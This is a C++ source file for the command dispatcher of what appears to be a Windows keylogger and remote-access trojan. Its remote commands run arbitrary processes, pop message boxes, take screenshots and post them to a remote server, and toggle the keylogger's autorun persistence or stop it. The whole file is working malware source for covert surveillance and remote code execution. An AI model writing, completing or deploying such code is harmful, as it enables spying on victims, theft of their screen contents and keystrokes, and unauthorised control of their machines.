#include "stdafx.h"
#include "CommandExe.h"
#include "Hax.h"
#include "Keylogger.h"
#include "Network.h"
#include "Screenshot.h"
#include "Settings.h"

static std::vector<std::string> split(const std::string &s, char delim) {
	std::stringstream ss(s);
	std::string item;
	std::vector<std::string> elems;
	while (std::getline(ss, item, delim)) {
		elems.push_back(item);
	}
	return elems;
}

inline std::string join_at_index(const std::vector<std::string> &v, std::string delim, int index = 0) {
	std::string out;
	std::for_each(v.begin() + index, v.end(), [&](const std::string &s) { out += s + delim; });
	return out;
}

struct command_t {
	std::string name;
	std::function<void(std::vector<std::string>)> func;
};

command_t commandDefs[] = {
		{
			"batch", [](std::vector<std::string> args) {
				if (!args.size())
					return;

				std::string fileArgs = join_at_index(args, " ");
				wchar_t dest[_MAX_PATH];
				mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);

				PROCESS_INFORMATION pi;
				ZeroMemory(&pi, sizeof(pi));

				STARTUPINFO si;
				ZeroMemory(&si, sizeof(si));

				si.cb = sizeof(si);

				CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			}
		},
		{
			"msgbox", [](std::vector<std::string> args) {
				if (!args.size())
					return;

				std::string msgboxText = join_at_index(args, " ");
				wchar_t text[1024];
				mbstowcs(text, msgboxText.c_str(), 1024);
				MessageBoxW(NULL, text, NULL, MB_OK);
			}
		},
		{
			"screenshot", [](std::vector<std::string> args) {

				screenshot.TakeScreenshot(V_FAKE_TMP1);

				FILE *fp;
				errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
				if (error != 0) {
					Error(_T("_tfopen failed"));
					goto g_1;
				}

				fseek(fp, 0, SEEK_END);
				size_t size = ftell(fp);
				fseek(fp, 0, SEEK_SET);


				char* buffer = (char*)malloc(size);
				if (!buffer)
				{
					Error(_T("Couldn't allocate buffer"));
					goto g_2;
				}

				if (fread_s(buffer, size, 1, size, fp) != size)
				{
					Error(_T("fread_s did not return size"));
					goto g_3;
				}

				char* response = network.SendPost(buffer, size, false);
				if (response) free(response);

				g_3:	free(buffer);
				g_2:	fclose(fp);
				g_1:	DeleteFile(_T("screen.png"));
			}
		},
		{
			"remove", [](std::vector<std::string> args) {
				keylogger.SetAutorun(false);
			}
		},
		{
			"exit", [](std::vector<std::string> args) {
				keylogger.Stop();
			}
		}
};

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(std::string cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::string> commands = split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::string> args = split(cmd, ' ');
		if (args.size()) {
			auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
			if (result != std::end(commandDefs)) {
				(*result).func(split(join_at_index(args, " ", 1), ' '));
			}
		}
	}
}